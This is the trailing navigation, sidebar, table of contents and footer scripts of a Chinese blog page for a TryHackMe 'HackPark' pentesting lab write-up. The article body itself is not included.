href="/posts/3bc2e38b.html" title="Offensive Pentesting-Alfred"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-09</div><div class="title">Offensive Pentesting-Alfred</div></div></a></div><div><a href="/posts/dea42128.html" title="Offensive Pentesting-DailyBugle"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-26</div><div class="title">Offensive Pentesting-DailyBugle</div></div></a></div><div><a href="/posts/dda9dc81.html" title="Offensive Pentesting-GameZone"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-26</div><div class="title">Offensive Pentesting-GameZone</div></div></a></div><div><a href="/posts/3e5876b.html" title="Offensive Pentesting-Overpass2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-11</div><div class="title">Offensive Pentesting-Overpass2</div></div></a></div><div><a href="/posts/34fc8f4b.html" title="Offensive Pentesting-Steel Mountain"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-12-09</div><div class="title">Offensive Pentesting-Steel Mountain</div></div></a></div><div><a href="/posts/c70d91b2.html" title="Offensive Pentesting-Skynet"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-26</div><div class="title">Offensive Pentesting-Skynet</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="post-series"><h3>thm学习笔记-系列：</h3><li><a class="title" href="/posts/e55fac08.html" title="Offensive Pentesting-HackPark">Offensive Pentesting-HackPark</a></li><li><a class="title" href="/posts/3e5876b.html" title="Offensive Pentesting-Overpass2">Offensive Pentesting-Overpass2</a></li><li><a class="title" href="/posts/3bc2e38b.html" title="Offensive Pentesting-Alfred">Offensive Pentesting-Alfred</a></li><li><a class="title" href="/posts/34fc8f4b.html" title="Offensive Pentesting-Steel Mountain">Offensive Pentesting-Steel Mountain</a></li><li><a class="title" href="/posts/dea42128.html" title="Offensive Pentesting-DailyBugle">Offensive Pentesting-DailyBugle</a></li><li><a class="title" href="/posts/dda9dc81.html" title="Offensive Pentesting-GameZone">Offensive Pentesting-GameZone</a></li><li><a class="title" href="/posts/77f3502a.html" title="Offensive Pentesting-Kenobi">Offensive Pentesting-Kenobi</a></li><li><a class="title" href="/posts/c70d91b2.html" title="Offensive Pentesting-Skynet">Offensive Pentesting-Skynet</a></li><li><a class="title" href="/posts/ca758c20.html" title="Offensive Pentesting-Vulnversity">Offensive Pentesting-Vulnversity</a></li></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">70</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" rel="external nofollow noreferrer" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Offensive-Pentesting-HackPark"><span class="toc-text">Offensive Pentesting-HackPark</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Deploy-the-vulnerable-Windows-machine"><span class="toc-text">Deploy the vulnerable Windows machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Using-Hydra-to-brute-force-a-login"><span class="toc-text">Using Hydra to brute-force a login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Compromise-the-machine"><span class="toc-text">Compromise the machine</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%81%B6%E6%84%8F%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="toc-text">上传恶意脚本：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6"><span class="toc-text">触发恶意文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-Privilege-Escalation-windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">Windows Privilege Escalation(windows权限提升)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%87%E6%8D%A2meterpreter-shell"><span class="toc-text">切换meterpreter shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WinPeas%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90"><span class="toc-text">WinPeas提升权限</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-text">思路总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/e55fac08.html" title="Offensive Pentesting-HackPark">Offensive Pentesting-HackPark</a><time datetime="2025-03-10T07:01:35.189Z" title="发表于 2025-03-10 15:01:35">2025-03-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/75d05e45.html" title="对博客进行SEO优化">对博客进行SEO优化</a><time datetime="2025-02-14T08:41:37.455Z" title="发表于 2025-02-14 16:41:37">2025-02-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6f5a3cd.html" title="2025启航杯wp">2025启航杯wp</a><time datetime="2025-01-25T15:56:54.364Z" title="发表于 2025-01-25 23:56:54">2025-01-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2f21d3bc.html" title="2025龙信考核比武">2025龙信考核比武</a><time datetime="2025-01-11T01:20:22.398Z" title="发表于 2025-01-11 09:20:22">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/67db48b9.html" title="2024冀信杯决赛">2024冀信杯决赛</a><time datetime="2025-01-10T16:54:11.458Z" title="发表于 2025-01-11 00:54:11">2025-01-11</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'ZClYARR22ZvT2ZwatJZ1136e-MdYXbMMI',
+      appKey: '7gejDss3xmCS5jmSo6PpiX2z',
+      avatar: 'monsterid',
+      serverURLs: 'https://zclyarr2.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
